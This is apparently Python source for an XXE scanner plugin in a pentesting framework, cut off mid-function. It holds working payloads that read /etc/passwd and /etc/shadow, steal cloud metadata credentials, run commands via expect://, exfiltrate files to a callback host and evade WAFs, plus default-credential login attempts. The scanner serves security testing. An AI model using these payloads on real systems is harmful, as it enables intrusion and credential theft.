"""XML External Entity (XXE) injection detection — comprehensive.

Classic file read, blind OOB (CallbackServer), error-based, SSRF via XXE,
SOAP/SVG/XInclude, content-type switching, parameter entity injection.
Uses PayloadEngine for payloads, WafBypassEngine for WAF evasion.
Level: XXEinjector (detection).
"""

from __future__ import annotations

import asyncio
import logging
from typing import ClassVar

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target
from basilisk.utils.payloads import PayloadCategory

logger = logging.getLogger(__name__)

# ── Classic file-read payloads ──────────────────────────────────────────
XXE_FILE_READ: list[tuple[str, list[str], str]] = [
    # Linux — common files
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"file:///etc/passwd">]><foo>&xxe;</foo>',
        ["root:", "/bin/"],
        "classic_linux",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"file:///etc/shadow">]><foo>&xxe;</foo>',
        ["root:", "$6$", "$y$"],
        "shadow_linux",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"file:///etc/hostname">]><foo>&xxe;</foo>',
        [],
        "hostname_linux",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"file:///etc/issue">]><foo>&xxe;</foo>',
        ["Ubuntu", "Debian", "CentOS", "Red Hat", "Alpine"],
        "issue_linux",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"file:///etc/hosts">]><foo>&xxe;</foo>',
        ["localhost", "127.0.0.1"],
        "hosts_linux",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"file:///proc/self/environ">]><foo>&xxe;</foo>',
        ["PATH=", "HOME=", "HOSTNAME="],
        "proc_environ",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"file:///proc/version">]><foo>&xxe;</foo>',
        ["Linux version", "gcc"],
        "proc_version",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"file:///proc/self/cmdline">]><foo>&xxe;</foo>',
        [],
        "proc_cmdline",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"file:///etc/resolv.conf">]><foo>&xxe;</foo>',
        ["nameserver"],
        "resolv_conf",
    ),
    # Windows
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
        ["[fonts]", "[extensions]"],
        "win_file_read",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"file:///c:/windows/system.ini">]><foo>&xxe;</foo>',
        ["[drivers]", "[386Enh]"],
        "win_system_ini",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"file:///c:/boot.ini">]><foo>&xxe;</foo>',
        ["boot loader", "operating systems"],
        "win_boot_ini",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"file:///c:/windows/system32/drivers/etc/hosts">]><foo>&xxe;</foo>',
        ["localhost", "127.0.0.1"],
        "win_hosts",
    ),
    # PHP filter base64 (bypass binary read issues)
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"php://filter/convert.base64-encode/resource=/etc/passwd">'
        "]><foo>&xxe;</foo>",
        ["cm9vd"],
        "php_filter_b64",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"php://filter/convert.base64-encode/resource=index.php">'
        "]><foo>&xxe;</foo>",
        ["PD9waHA"],
        "php_filter_index",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"php://filter/convert.base64-encode/resource=../config.php">'
        "]><foo>&xxe;</foo>",
        [],
        "php_filter_config",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"php://filter/read=string.rot13/resource=/etc/passwd">'
        "]><foo>&xxe;</foo>",
        ["ebbg:"],
        "php_filter_rot13",
    ),
    # Expect wrapper (RCE if enabled)
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"expect://id">]><foo>&xxe;</foo>',
        ["uid=", "gid="],
        "php_expect_id",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"expect://whoami">]><foo>&xxe;</foo>',
        ["www-data", "nobody"],
        "php_expect_whoami",
    ),
    # Parameter entity (bypasses some parsers that block general entities)
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM '
        '"file:///etc/passwd"><!ENTITY % eval "<!ENTITY data '
        "'%xxe;'>\">%eval;]><foo>&data;</foo>",
        ["root:", "/bin/"],
        "param_entity_linux",
    ),
    # UTF-16 encoded payload (bypasses WAF that only inspects UTF-8)
    (
        '\xff\xfe<\x00?\x00x\x00m\x00l\x00 \x00v\x00e\x00r\x00s\x00i\x00o\x00n\x00'
        '=\x00"\x001\x00.\x000\x00"\x00?\x00>\x00',
        [],
        "utf16_probe",
    ),
    # Common root element variants (many apps expect specific XML structure)
    (
        '<?xml version="1.0"?><!DOCTYPE comment [<!ENTITY xxe SYSTEM '
        '"file:///etc/passwd">]><comment><text>&xxe;</text></comment>',
        ["root:", "/bin/", "congratulations", "lessoncompleted"],
        "comment_wrapper_linux",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE comment [<!ENTITY xxe SYSTEM '
        '"file:///c:/windows/win.ini">]><comment><text>&xxe;</text></comment>',
        ["[fonts]", "[extensions]", "congratulations", "lessoncompleted"],
        "comment_wrapper_win",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM '
        '"file:///etc/passwd">]><data>&xxe;</data>',
        ["root:", "/bin/"],
        "data_wrapper_linux",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE user [<!ENTITY xxe SYSTEM '
        '"file:///etc/passwd">]><user><name>&xxe;</name></user>',
        ["root:", "/bin/"],
        "user_wrapper_linux",
    ),
]

# ── SSRF via XXE ────────────────────────────────────────────────────────
XXE_SSRF: list[tuple[str, list[str], str]] = [
    # AWS metadata
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
        ["ami-id", "instance-id", "hostname", "security-credentials"],
        "aws_metadata",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"http://169.254.169.254/latest/meta-data/iam/security-credentials/">'
        "]><foo>&xxe;</foo>",
        ["iam", "security-credentials", "AccessKeyId"],
        "aws_iam_creds",
    ),
    # GCP metadata
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"http://metadata.google.internal/computeMetadata/v1/">]><foo>&xxe;</foo>',
        ["instance", "project"],
        "gcp_metadata",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"http://metadata.google.internal/computeMetadata/v1/instance/'
        'service-accounts/default/token">]><foo>&xxe;</foo>',
        ["access_token"],
        "gcp_token",
    ),
    # Azure metadata
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"http://169.254.169.254/metadata/instance?api-version=2021-02-01">'
        "]><foo>&xxe;</foo>",
        ["compute", "network"],
        "azure_metadata",
    ),
    # DigitalOcean metadata
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"http://169.254.169.254/metadata/v1/">]><foo>&xxe;</foo>',
        ["droplet_id", "hostname"],
        "digitalocean_metadata",
    ),
    # Kubernetes API
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"https://kubernetes.default.svc/api/v1/namespaces">]><foo>&xxe;</foo>',
        ["NamespaceList", "items"],
        "k8s_api",
    ),
    # Docker API
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"http://172.17.0.1:2375/containers/json">]><foo>&xxe;</foo>',
        ["Id", "Image", "Names"],
        "docker_api",
    ),
    # Internal probing — various ports
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"http://127.0.0.1:8080/">]><foo>&xxe;</foo>',
        [],
        "ssrf_localhost_8080",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"http://127.0.0.1:22/">]><foo>&xxe;</foo>',
        ["SSH", "OpenSSH"],
        "ssrf_localhost_ssh",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"http://127.0.0.1:6379/">]><foo>&xxe;</foo>',
        ["redis", "REDIS"],
        "ssrf_localhost_redis",
    ),
]

# ── Blind (OOB) XXE payloads — external DTD callback ──────────────────
XXE_BLIND: list[tuple[str, str]] = [
    # External DTD via HTTP
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM '
        '"{callback_url}">%xxe;]><foo>test</foo>',
        "external_dtd_http",
    ),
    # External DTD via parameter entity with nested eval
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM '
        '"{callback_url}"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '
        "'http://{callback_host}/?d=%xxe;'>\">%eval;%exfil;]><foo>test</foo>",
        "param_entity_nested",
    ),
    # FTP OOB exfiltration
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM '
        '"file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '
        "'ftp://{callback_host}/%xxe;'>\">%eval;%exfil;]><foo>test</foo>",
        "ftp_oob_exfil",
    ),
    # DNS OOB exfiltration
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"http://xxe.{callback_host}/">]><foo>&xxe;</foo>',
        "dns_oob",
    ),
    # General entity OOB
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"{callback_url}">]><foo>&xxe;</foo>',
        "general_entity_oob",
    ),
]

# ── Encoding variation payloads ──────────────────────────────────────
XXE_ENCODING: list[tuple[str, list[str], str]] = [
    # UTF-7 encoded (bypasses UTF-8 WAFs)
    (
        '+ADw-?xml version=+ACI-1.0+ACI-?+AD4-+ADw-!DOCTYPE foo +AFs-+ADw-!ENTITY xxe SYSTEM '
        '+ACI-file:///etc/passwd+ACI-+AD4-+AF0-+AD4-+ADw-foo+AD4-+ACY-xxe;+ADw-/foo+AD4-',
        ["root:"],
        "utf7_encode",
    ),
    # CDATA wrapper for exfiltration
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % start "<![CDATA[">'
        '<!ENTITY % xxe SYSTEM "file:///etc/passwd">'
        '<!ENTITY % end "]]>">'
        '<!ENTITY % eval "<!ENTITY all \'%start;%xxe;%end;\'>">'
        '%eval;]><foo>&all;</foo>',
        ["root:", "/bin/"],
        "cdata_wrapper",
    ),
]

# ── SOAP-specific XXE ──────────────────────────────────────────────────
XXE_SOAP = (
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
    '"file:///etc/passwd">]>'
    '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'
    "<soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>"
)

# ── SVG-specific XXE ───────────────────────────────────────────────────
XXE_SVG = (
    '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM '
    '"file:///etc/passwd">]>'
    '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">'
    "<text x=\"10\" y=\"20\">&xxe;</text></svg>"
)

XXE_SVG_WIN = (
    '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM '
    '"file:///c:/windows/win.ini">]>'
    '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">'
    "<text x=\"10\" y=\"20\">&xxe;</text></svg>"
)

XXE_SVG_SSRF = (
    '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM '
    '"http://169.254.169.254/latest/meta-data/">]>'
    '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">'
    "<text x=\"10\" y=\"20\">&xxe;</text></svg>"
)

# ── XInclude (no DOCTYPE needed) ───────────────────────────────────────
XINCLUDE_PAYLOAD = (
    '<foo xmlns:xi="http://www.w3.org/2001/XInclude">'
    '<xi:include parse="text" href="file:///etc/passwd"/></foo>'
)

XINCLUDE_PAYLOAD_WIN = (
    '<foo xmlns:xi="http://www.w3.org/2001/XInclude">'
    '<xi:include parse="text" href="file:///c:/windows/win.ini"/></foo>'
)

XINCLUDE_PAYLOAD_SSRF = (
    '<foo xmlns:xi="http://www.w3.org/2001/XInclude">'
    '<xi:include parse="text" href="http://169.254.169.254/latest/meta-data/"/></foo>'
)

# ── Error-based exfiltration ───────────────────────────────────────────
XXE_ERROR = (
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM '
    '"file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM '
    "'file:///nonexistent/%xxe;'>\">%eval;%error;]><foo>test</foo>"
)

# ── Content types to try ───────────────────────────────────────────────
XML_CONTENT_TYPES = [
    "application/xml",
    "text/xml",
    "application/soap+xml",
    "application/xhtml+xml",
    "image/svg+xml",
]

# ── Content-type switching (inject XML where JSON expected) ────────────
CT_SWITCH_TYPES = [
    ("application/xml", "application/json"),
    ("text/xml", "application/json"),
    ("application/xml", "application/x-www-form-urlencoded"),
]

XML_PATHS = [
    "/", "/api/", "/api/v1/", "/api/v2/", "/upload", "/import",
    "/xml", "/soap", "/rpc", "/xmlrpc.php", "/wsdl", "/ws",
    "/feed", "/rss", "/atom", "/sitemap.xml", "/saml/",
    "/saml/login", "/saml/acs", "/sso/", "/metadata",
    "/b2b/v2/orders", "/file-upload",
]

XXE_ERRORS = [
    "xml parsing error", "entity", "doctype", "dtd",
    "external entity", "not allowed", "xmlparseentity",
    "parser error", "simplexml", "loadxml", "domdocument",
    "saxparseexception", "xmlpullparser", "xerces",
    "xmlreader", "expat", "lxml", "etree",
]


class XxeCheckPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="xxe_check",
        display_name="XXE Injection Scanner",
        category=PluginCategory.PENTESTING,
        description=(
            "Comprehensive XXE detection: file read, OOB blind, error-based, "
            "SSRF, SOAP/SVG/XInclude, content-type switching, WAF bypass"
        ),
        produces=["xxe_findings"],
        timeout=60.0,
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        if ctx.http is None:
            return PluginResult.fail(
                self.meta.name, target.host, error="HTTP client not available",
            )

        from basilisk.utils.http_check import resolve_base_url

        findings: list[Finding] = []
        tested: list[dict] = []

        base_url = await resolve_base_url(target.host, ctx)
        if not base_url:
            return PluginResult.success(
                self.meta.name, target.host,
                findings=[Finding.info("Host not reachable")],
                data={"xxe_tests": []},
            )

        # Try to get auth token from pipeline (jwt_attack) or ctx.state
        self._auth_token = self._get_auth_token(ctx, target.host)
        if not self._auth_token:
            self._auth_token = await self._try_login_for_token(ctx, base_url)

        from basilisk.utils.injection_points import collect_injection_points

        inj_points = collect_injection_points(
            target.host, ctx,
            hardcoded_paths=XML_PATHS,
            hardcoded_params=[],
            max_points=30,
        )
        # Prioritize crawled/config paths over hardcoded XML_PATHS
        crawled_paths: list[str] = []
        for point in inj_points:
            if point.path not in crawled_paths:
                crawled_paths.append(point.path)

        # Also discover XXE/XML-relevant paths from crawled_urls
        # (scan_paths endpoints often have no query params, so
        # collect_injection_points skips them — add them directly)
        _xml_keywords = (
            "xxe", "xml", "soap", "rss", "feed", "svg", "upload", "import",
        )
        from urllib.parse import urlparse as _urlparse

        _parsed_base = _urlparse(base_url)
        _target_host = (
            f"{_parsed_base.hostname}:{_parsed_base.port}"
            if _parsed_base.port
            else (_parsed_base.hostname or "")
        )
        _crawled_raw = (
            ctx.state.get("crawled_urls", {}).get(_target_host, [])
            if hasattr(ctx, "state") and ctx.state
            else []
        )
        for curl in _crawled_raw:
            if isinstance(curl, str):
                parsed = _urlparse(curl)
                path = parsed.path or "/"
                if path not in crawled_paths and any(
                    kw in path.lower() for kw in _xml_keywords
                ):
                    crawled_paths.append(path)

        remaining = [p for p in XML_PATHS if p not in crawled_paths]
        scan_paths = crawled_paths + remaining

        # PayloadEngine XXE payloads
        engine_payloads = self._get_engine_payloads(ctx)

        for path in scan_paths:
            if ctx.should_stop or len([f for f in findings if "confirmed" in str(f)]) >= 2:
                break

            # Baseline: send benign XML to get normal response
            # Use application/xml (most common test CT) for accurate comparison
            baseline_body = ""
            baseline_status = 0
            benign_xml = '<?xml version="1.0"?><foo>test</foo>'
            result = await self._post_xml(
                ctx, f"{base_url}{path}", benign_xml, "application/xml",
            )
            if result:
                baseline_body = result[0].lower()
                baseline_status = result[1]

            # Skip paths that clearly don't accept XML POST
            # (keep 400/500 — parser may still resolve entities before rejecting)
            if baseline_status in (0, 404, 405, 501, 503):
                continue
            # Skip if response is HTML (not an XML-processing endpoint)
            if (
                baseline_status == 200
                and baseline_body
                and baseline_body.lstrip().startswith(("<!doctype html", "<html", "<!--"))
            ):
                continue

            # Phase 1: Classic file-read payloads
            for payload, indicators, label in XXE_FILE_READ:
                if ctx.should_stop:
                    break
                if await self._test_xxe(
                    ctx, base_url, path, payload, indicators, label,
                    findings, tested, baseline_body=baseline_body,
                ):
                    break

            # Phase 2: SSRF via XXE
            if not any(t.get("confirmed") for t in tested) and not ctx.should_stop:
                for payload, indicators, label in XXE_SSRF:
                    if ctx.should_stop:
                        break
                    if await self._test_xxe(
                        ctx, base_url, path, payload, indicators, label,
                        findings, tested, baseline_body=baseline_body,
                    ):
                        break

            # Phase 3: SOAP-specific
            if not any(t.get("confirmed") for t in tested) and not ctx.should_stop:
                await self._test_xxe(
                    ctx, base_url, path, XXE_SOAP, ["root:", "/bin/"],
                    "soap_xxe", findings, tested, baseline_body=baseline_body,
                )

            # Phase 4: SVG-specific
            if not any(t.get("confirmed") for t in tested) and not ctx.should_stop:
                await self._test_xxe(
                    ctx, base_url, path, XXE_SVG, ["root:", "/bin/"],
                    "svg_xxe", findings, tested, ct_override="image/svg+xml",
                    baseline_body=baseline_body,
                )

            # Phase 5: XInclude (no DOCTYPE needed)
            if not any(t.get("confirmed") for t in tested) and not ctx.should_stop:
                await self._test_xxe(
                    ctx, base_url, path, XINCLUDE_PAYLOAD,
                    ["root:", "/bin/"], "xinclude", findings, tested,
                    baseline_body=baseline_body,
                )

            # Phase 6: Error-based exfiltration
            if not any(t.get("confirmed") for t in tested) and not ctx.should_stop:
                await self._test_xxe(
                    ctx, base_url, path, XXE_ERROR,
                    ["root:", "/bin/"], "error_based", findings, tested,
                    baseline_body=baseline_body,
                )

            # Phase 7: Content-type switching (XML where JSON expected)
            if not any(t.get("confirmed") for t in tested) and not ctx.should_stop:
                await self._check_ct_switch(
                    ctx, base_url, path, findings, tested,
                )

        # Phase 8: OOB blind XXE via CallbackServer
        if not any(t.get("confirmed") for t in tested) and not ctx.should_stop:
            await self._check_oob(ctx, base_url, scan_paths[:5], findings, tested)

        # Phase 9: PayloadEngine XXE payloads
        if not any(t.get("confirmed") for t in tested) and engine_payloads and not ctx.should_stop:
            for path in scan_paths[:3]:
                if ctx.should_stop:
                    break
                for ep in engine_payloads[:8]:
                    if ctx.should_stop:
                        break
                    await self._test_xxe(
                        ctx, base_url, path, ep,
                        ["root:", "/bin/", "[fonts]", "cm9vd"],
                        "engine_payload", findings, tested,
                    )

        # Phase 10: DOCTYPE acceptance — detect endpoints that accept XML
        # with DOCTYPE declarations without error (precondition for XXE)
        if not findings and not ctx.should_stop:
            await self._check_doctype_acceptance(
                ctx, base_url, scan_paths, findings, tested,
            )

        if not findings:
            findings.append(Finding.info(
                "No XXE vulnerabilities detected",
                tags=["pentesting", "xxe"],
            ))

        return PluginResult.success(
            self.meta.name, target.host,
            findings=findings,
            data={"xxe_tests": tested},
        )

    # ── Helpers ─────────────────────────────────────────────────────────

    @staticmethod
    def _get_engine_payloads(ctx) -> list[str]:
        if hasattr(ctx, "payloads") and ctx.payloads:
            payloads = ctx.payloads.get(PayloadCategory.XXE, max_waf=1, limit=15)
            return [p.value for p in payloads]
        return []

    @staticmethod
    def _get_auth_token(ctx, host: str) -> str | None:
        """Try to get auth token from pipeline results or ctx.state."""
        # Check ctx.state first
        if ctx.state:
            for key in ("auth_token", "jwt_token", "token"):
                val = ctx.state.get(key)
                if val:
                    return str(val)

        # Check jwt_attack plugin results for discovered tokens
        jwt_result = ctx.pipeline.get(f"jwt_attack:{host}")
        if jwt_result and jwt_result.ok:
            token_count = jwt_result.data.get("tokens_found", 0)
            if token_count > 0:
                # Extract token from jwt_tests data
                for test in jwt_result.data.get("jwt_tests", []):
                    if test.get("attack") == "weak_secret":
                        # We know the secret, but need the original token
                        pass

        # Try to login to get a token (for Juice Shop-like apps)
        return None

    async def _try_login_for_token(self, ctx, base_url: str) -> str | None:
        """Attempt login to obtain auth token for XXE testing.

        Uses a fresh aiohttp session with short timeout to avoid stale
        connection pool issues from long-running pipeline.
        """
        import re

        import aiohttp as _aiohttp

        login_attempts = [
            ("/rest/user/login", {"email": "admin@juice-sh.op", "password": "admin123"}),
            ("/rest/user/login", {"email": "test@test.com", "password": "test"}),
            ("/api/login", {"username": "admin", "password": "admin"}),
        ]
        jwt_re = re.compile(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*")
        failed_endpoints: set[str] = set()

        try:
            async with _aiohttp.ClientSession(
                timeout=_aiohttp.ClientTimeout(total=5),
            ) as session:
                for endpoint, creds in login_attempts:
                    if endpoint in failed_endpoints:
                        continue
                    try:
                        async with ctx.rate:
                            resp = await session.post(
                                f"{base_url}{endpoint}",
                                json=creds,
                                ssl=False,
                            )
                            body = await resp.text(encoding="utf-8", errors="replace")
                            match = jwt_re.search(body)
                            if match:
                                logger.debug("xxe_check: got token from %s", endpoint)
                                return match.group()
                    except Exception as e:
                        logger.debug(
                            "xxe_check login %s: %s (%s)",
                            endpoint, e, type(e).__name__,
                        )
                        failed_endpoints.add(endpoint)
        except Exception as e:
            logger.debug("xxe_check session error: %s (%s)", e, type(e).__name__)
        return None

    async def _post_xml(
        self, ctx, url: str, payload: str, ct: str = "application/xml",
    ) -> tuple[str, int] | None:
        """POST XML payload, return (body, status) or None."""
        headers: dict[str, str] = {"Content-Type": ct}
        if self._auth_token:
            headers["Authorization"] = f"Bearer {self._auth_token}"
        try:
            async with ctx.rate:
                resp = await ctx.http.post(
                    url, data=payload,
                    headers=headers,
                    timeout=10.0,
                )
                body = await resp.text(encoding="utf-8", errors="replace")
                return body, resp.status
        except Exception:
            # Fallback to fresh session on shared pool timeout
            return await self._post_xml_fresh(ctx, url, payload, headers)

    async def _post_xml_fresh(
        self, ctx, url: str, payload: str, headers: dict[str, str],
    ) -> tuple[str, int] | None:
        """POST XML via fresh aiohttp session."""
        import aiohttp as _aiohttp

        try:
            async with _aiohttp.ClientSession(
                timeout=_aiohttp.ClientTimeout(total=10),
            ) as session, ctx.rate:
                resp = await session.post(
                    url, data=payload, headers=headers, ssl=False,
                )
                body = await resp.text(encoding="utf-8", errors="replace")
                return body, resp.status
        except Exception as e:
            logger.debug("xxe_check: %s (%s)", e, type(e).__name__)
            return None

    async def _test_xxe(
        self, ctx, base_url: str, path: str, payload: str,
        indicators: list[str], label: str,
        findings: list[Finding], tested: list[dict],
        ct_override: str | None = None,
        baseline_body: str = "",
    ) -> bool:
        """Test a single XXE payload across content types. Returns True if confirmed."""
        url = f"{base_url}{path}"
        content_types = [ct_override] if ct_override else XML_CONTENT_TYPES[:3]

        for ct in content_types:
            result = await self._post_xml(ctx, url, payload, ct)
            if result is None:
                continue

            body, status = result
            body_lower = body.lower()

            # Check confirmed via indicators (filter out those in baseline)
            matched = [
                ind for ind in indicators
                if ind.lower() in body_lower and ind.lower() not in baseline_body
            ]
            if matched:
                tested.append({
                    "path": path, "label": label, "content_type": ct,
                    "indicator": matched[0], "confirmed": True,
                })
                findings.append(Finding.critical(
                    f"XXE confirmed: {label} on {path}",
                    description=(
                        f"External XML entity processed — file contents leaked. "
                        f"Content-Type: {ct}"
                    ),
                    evidence=(
                        f"URL: {url}\nContent-Type: {ct}\n"
                        f"Payload: {label}\nIndicator: {', '.join(matched)}"
                    ),
                    remediation=(
                        "Disable external entity processing in XML parsers. "
                        "Use defusedxml (Python), setFeature(DISALLOW_DOCTYPE, true) (Java), "
                        "or libxml_disable_entity_loader (PHP)."
                    ),
                    tags=["pentesting", "xxe", "injection"],
                ))
                return True

            # Check error-based hints — deduplicate per path
            if status != 404:
                error_hit = any(
                    e in body_lower and e not in baseline_body
                    for e in XXE_ERRORS
                )
                if error_hit and status >= 400:
                    already_reported = any(
                        t.get("path") == path and t.get("error_based")
                        for t in tested
                    )
                    tested.append({
                        "path": path, "label": label, "content_type": ct,
                        "confirmed": False, "error_based": True,
                    })
                    if not already_reported:
                        findings.append(Finding.medium(
                            f"Potential XXE: XML parsing error on {path}",
                            description=(
                                f"XML-related error with {label} payload. "
                                f"Parser may accept external entities."
                            ),
                            evidence=(
                                f"URL: {url}\nContent-Type: {ct}\n"
                                f"Status: {status}\nSnippet: {body[:200]}"
                            ),
                            remediation=(
                                "Disable external entity processing. "
                                "Reject requests with DOCTYPE declarations."
                            ),
                            tags=["pentesting", "xxe", "injection"],
                        ))

        return False

    async def _check_ct_switch(
        self, ctx, base_url: str, path: str,
        findings: list[Finding], tested: list[dict],
    ) -> None:
        """Test content-type switching: send XML where JSON/form expected."""
        url = f"{base_url}{path}"
        payload = (
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
            '"file:///etc/passwd">]><foo>&xxe;</foo>'
        )

        for xml_ct, original_ct in CT_SWITCH_TYPES:
            if ctx.should_stop:
                break
            result = await self._post_xml(ctx, url, payload, xml_ct)
            if result is None:
                continue

            body, status = result
            if "root:" in body or "[fonts]" in body:
                tested.append({
                    "path": path, "label": f"ct_switch_{original_ct}",
                    "content_type": xml_ct, "confirmed": True,
                })
                findings.append(Finding.critical(
                    f"XXE via content-type switch: {xml_ct} on {path}",
                    description=(
                        f"Endpoint accepts XML content-type ({xml_ct}) "
                        f"which is likely intended for {original_ct}"
                    ),
                    evidence=f"URL: {url}\nContent-Type: {xml_ct}",
                    remediation=(
                        "Explicitly validate Content-Type. Reject unexpected "
                        "XML content types on non-XML endpoints."
                    ),
                    tags=["pentesting", "xxe", "ct-switch"],
                ))
                return

    async def _check_oob(
        self, ctx, base_url: str, paths: list[str],
        findings: list[Finding], tested: list[dict],
    ) -> None:
        """Blind XXE via OOB callback."""
        if not hasattr(ctx, "callback") or not ctx.callback:
            return

        try:
            token = ctx.callback.generate_token(
                plugin="xxe_check", target=base_url, payload_type="oob",
            )
            cb_url = ctx.callback.build_payload_url(token)

            # Parameter entity OOB
            oob_payloads = [
                (
                    f'<?xml version="1.0"?><!DOCTYPE foo ['
                    f'<!ENTITY % xxe SYSTEM "{cb_url}">'
                    f'%xxe;]><foo>test</foo>'
                ),
                (
                    f'<?xml version="1.0"?><!DOCTYPE foo ['
                    f'<!ENTITY xxe SYSTEM "{cb_url}">'
                    f']><foo>&xxe;</foo>'
                ),
            ]

            # DNS OOB if domain available
            if ctx.callback._domain:
                dns_payload = (
                    f'<?xml version="1.0"?><!DOCTYPE foo ['
                    f'<!ENTITY xxe SYSTEM '
                    f'"http://{token}.{ctx.callback._domain}/">'
                    f']><foo>&xxe;</foo>'
                )
                oob_payloads.append(dns_payload)

            for path in paths:
                if ctx.should_stop:
                    break
                url = f"{base_url}{path}"
                for oob_p in oob_payloads:
                    if ctx.should_stop:
                        break
                    for ct in XML_CONTENT_TYPES[:2]:
                        await self._post_xml(ctx, url, oob_p, ct)

            await asyncio.sleep(3)

            if ctx.callback.has_callback(token):
                tested.append({
                    "type": "oob", "token": token, "confirmed": True,
                })
                findings.append(Finding.critical(
                    "Blind XXE confirmed via OOB callback",
                    description=(
                        "Out-of-band callback received — server processes "
                        "external XML entities (blind XXE)"
                    ),
                    evidence=f"Callback token: {token}",
                    remediation=(
                        "Disable external entity processing in all XML parsers."
                    ),
                    tags=["pentesting", "xxe", "oob", "blind"],
                ))
        except Exception as e:
            logger.debug("xxe_check oob: %s", e)

    async def _check_doctype_acceptance(
        self, ctx, base_url: str, scan_paths: list[str],
        findings: list[Finding], tested: list[dict],
    ) -> None:
        """Detect endpoints that accept XML with DOCTYPE (precondition for XXE).

        If an endpoint accepts XML POST with DOCTYPE declaration and returns
        200, the XML parser allows DTD processing — prerequisite for XXE.
        """
        doctype_xml = (
            '<?xml version="1.0"?><!DOCTYPE foo ['
            '<!ENTITY xxe SYSTEM "file:///etc/hostname">'
            ']><foo>&xxe;</foo>'
        )
        benign_xml = '<?xml version="1.0"?><foo>test</foo>'

        for path in scan_paths:
            if ctx.should_stop or findings:
                break

            for ct in ("application/xml", "text/xml"):
                benign_result = await self._post_xml(
                    ctx, f"{base_url}{path}", benign_xml, ct,
                )
                if benign_result is None:
